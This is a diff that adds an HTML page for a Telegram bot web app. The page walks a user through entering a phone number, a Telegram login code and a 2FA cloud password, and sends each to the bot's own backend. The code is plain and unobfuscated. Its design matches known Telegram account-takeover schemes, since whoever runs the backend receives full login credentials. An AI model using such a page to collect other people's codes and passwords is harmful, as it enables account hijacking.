@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Authorization</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: var(--tg-theme-bg-color, #ffffff);
+            color: var(--tg-theme-text-color, #000000);
+            padding: 20px;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: var(--tg-theme-text-color, #000000);
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: var(--tg-theme-hint-color, #999999);
+            margin-bottom: 24px;
+        }
+
+        .step {
+            display: none;
+        }
+
+        .step.active {
+            display: block;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 8px;
+            color: var(--tg-theme-text-color, #000000);
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            border: 1px solid var(--tg-theme-hint-color, #cccccc);
+            border-radius: 8px;
+            background: var(--tg-theme-bg-color, #ffffff);
+            color: var(--tg-theme-text-color, #000000);
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--tg-theme-button-color, #3390ec);
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            border: none;
+            border-radius: 8px;
+            background: var(--tg-theme-button-color, #3390ec);
+            color: var(--tg-theme-button-text-color, #ffffff);
+            cursor: pointer;
+            margin-top: 8px;
+        }
+
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        button:not(:disabled):active {
+            opacity: 0.8;
+        }
+
+        .status {
+            margin-top: 16px;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 14px;
+            display: none;
+        }
+
+        .status.visible {
+            display: block;
+        }
+
+        .status.error {
+            background: #ffebee;
+            color: #c62828;
+            border: 1px solid #ef5350;
+        }
+
+        .status.success {
+            background: #e8f5e9;
+            color: #2e7d32;
+            border: 1px solid #66bb6a;
+        }
+
+        .status.info {
+            background: #e3f2fd;
+            color: #1565c0;
+            border: 1px solid #42a5f5;
+        }
+
+        .hint {
+            font-size: 12px;
+            color: var(--tg-theme-hint-color, #999999);
+            margin-top: 8px;
+        }
+
+        .loader {
+            display: inline-block;
+            width: 14px;
+            height: 14px;
+            border: 2px solid var(--tg-theme-button-text-color, #ffffff);
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Step 1: Phone Number -->
+        <div id="step1" class="step active">
+            <h1>Phone Number</h1>
+            <p class="subtitle">Enter your phone number to receive a confirmation code</p>
+
+            <div class="form-group">
+                <label for="phone">Phone Number</label>
+                <input type="tel" id="phone" placeholder="+1234567890" autocomplete="tel">
+                <p class="hint">Include country code, e.g., +1 for US, +7 for Russia</p>
+            </div>
+
+            <button id="sendCodeBtn" onclick="sendCode()">Send Code</button>
+
+            <div id="status1" class="status"></div>
+        </div>
+
+        <!-- Step 2: Confirmation Code -->
+        <div id="step2" class="step">
+            <h1>Confirmation Code</h1>
+            <p class="subtitle">Enter the code sent to your phone</p>
+
+            <div class="form-group">
+                <label for="code">Code</label>
+                <input type="text" id="code" placeholder="12345" autocomplete="one-time-code" inputmode="numeric">
+                <p class="hint">Check your Telegram messages for the code</p>
+            </div>
+
+            <button id="confirmCodeBtn" onclick="confirmCode()">Confirm Code</button>
+
+            <div id="status2" class="status"></div>
+        </div>
+
+        <!-- Step 3: 2FA Password (if needed) -->
+        <div id="step3" class="step">
+            <h1>2FA Password</h1>
+            <p class="subtitle">Enter your two-factor authentication password</p>
+
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" placeholder="Your 2FA password" autocomplete="current-password">
+                <p class="hint">This is your cloud password, not your phone passcode</p>
+            </div>
+
+            <button id="confirmPasswordBtn" onclick="confirmPassword()">Confirm Password</button>
+
+            <div id="status3" class="status"></div>
+        </div>
+
+        <!-- Step 4: Success -->
+        <div id="step4" class="step">
+            <h1>Success!</h1>
+            <p class="subtitle">You're now authenticated. You can close this window.</p>
+
+            <div class="status success visible">
+                Authentication completed successfully. Return to the bot to continue.
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Initialize Telegram WebApp
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand();
+
+        const initData = tg.initData;
+
+        if (!initData) {
+            showStatus('status1', 'error', 'This page must be opened from Telegram bot');
+        }
+
+        // Utility functions
+        function showStatus(elementId, type, message) {
+            const statusEl = document.getElementById(elementId);
+            statusEl.className = `status visible ${type}`;
+            statusEl.textContent = message;
+        }
+
+        function hideStatus(elementId) {
+            const statusEl = document.getElementById(elementId);
+            statusEl.className = 'status';
+        }
+
+        function showStep(stepNumber) {
+            document.querySelectorAll('.step').forEach(step => step.classList.remove('active'));
+            document.getElementById(`step${stepNumber}`).classList.add('active');
+        }
+
+        function setButtonLoading(buttonId, loading) {
+            const btn = document.getElementById(buttonId);
+            if (loading) {
+                btn.disabled = true;
+                btn.innerHTML = '<span class="loader"></span>Loading...';
+            } else {
+                btn.disabled = false;
+                btn.textContent = btn.id.includes('send') ? 'Send Code' :
+                                  btn.id.includes('Code') ? 'Confirm Code' :
+                                  'Confirm Password';
+            }
+        }
+
+        // Step 1: Send code
+        async function sendCode() {
+            const phone = document.getElementById('phone').value.trim();
+
+            if (!phone) {
+                showStatus('status1', 'error', 'Please enter your phone number');
+                return;
+            }
+
+            if (!phone.startsWith('+')) {
+                showStatus('status1', 'error', 'Phone number must start with + and country code');
+                return;
+            }
+
+            hideStatus('status1');
+            setButtonLoading('sendCodeBtn', true);
+
+            try {
+                const response = await fetch('/auth/send_code', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        phone: phone,
+                        initData: initData
+                    })
+                });
+
+                const data = await response.json();
+
+                if (response.ok && data.ok) {
+                    showStatus('status1', 'success', 'Code sent! Check your Telegram messages.');
+                    setTimeout(() => {
+                        showStep(2);
+                        document.getElementById('code').focus();
+                    }, 1000);
+                } else {
+                    showStatus('status1', 'error', data.detail || 'Failed to send code');
+                }
+            } catch (error) {
+                showStatus('status1', 'error', 'Network error. Please try again.');
+            } finally {
+                setButtonLoading('sendCodeBtn', false);
+            }
+        }
+
+        // Step 2: Confirm code
+        async function confirmCode() {
+            const code = document.getElementById('code').value.trim().replace(/\s/g, '').replace(/-/g, '');
+
+            if (!code) {
+                showStatus('status2', 'error', 'Please enter the confirmation code');
+                return;
+            }
+
+            hideStatus('status2');
+            setButtonLoading('confirmCodeBtn', true);
+
+            try {
+                const response = await fetch('/auth/confirm_code', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        code: code,
+                        initData: initData
+                    })
+                });
+
+                const data = await response.json();
+
+                if (response.ok && data.ok) {
+                    if (data.need_password) {
+                        showStatus('status2', 'info', '2FA enabled. Please enter your password.');
+                        setTimeout(() => {
+                            showStep(3);
+                            document.getElementById('password').focus();
+                        }, 1000);
+                    } else {
+                        showStep(4);
+                        setTimeout(() => {
+                            tg.close();
+                        }, 2000);
+                    }
+                } else {
+                    showStatus('status2', 'error', data.detail || 'Invalid code');
+                }
+            } catch (error) {
+                showStatus('status2', 'error', 'Network error. Please try again.');
+            } finally {
+                setButtonLoading('confirmCodeBtn', false);
+            }
+        }
+
+        // Step 3: Confirm password
+        async function confirmPassword() {
+            const password = document.getElementById('password').value;
+
+            if (!password) {
+                showStatus('status3', 'error', 'Please enter your 2FA password');
+                return;
+            }
+
+            hideStatus('status3');
+            setButtonLoading('confirmPasswordBtn', true);
+
+            try {
+                const response = await fetch('/auth/confirm_password', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        password: password,
+                        initData: initData
+                    })
+                });
+
+                const data = await response.json();
+
+                if (response.ok && data.ok) {
+                    showStep(4);
+                    setTimeout(() => {
+                        tg.close();
+                    }, 2000);
+                } else {
+                    showStatus('status3', 'error', data.detail || 'Invalid password');
+                }
+            } catch (error) {
+                showStatus('status3', 'error', 'Network error. Please try again.');
+            } finally {
+                setButtonLoading('confirmPasswordBtn', false);
+            }
+        }
+
+        // Handle Enter key
+        document.getElementById('phone').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') sendCode();
+        });
+
+        document.getElementById('code').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') confirmCode();
+        });
+
+        document.getElementById('password').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') confirmPassword();
+        });
+    </script>
+</body>
+</html>
